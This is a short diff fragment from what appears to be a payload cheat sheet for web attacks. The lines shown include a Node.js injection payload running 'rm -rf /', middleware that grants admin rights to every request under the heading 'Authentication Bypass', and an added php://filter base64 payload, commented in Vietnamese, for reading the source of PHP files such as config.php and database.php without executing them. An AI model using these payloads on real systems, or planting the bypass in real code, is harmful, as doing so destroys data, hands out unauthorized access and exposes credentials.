@@ -19,4 +19,6 @@ require('child_process').execSync('rm -rf /')
 Authentication Bypass
 app.use((req, res, next) => { req.isAdmin = true; next(); })
 
+//mở các file PHP ( config.php, database.php) trên browser mà không thực thi
+php://filter/convert.base64-encode/resource=home.php
 
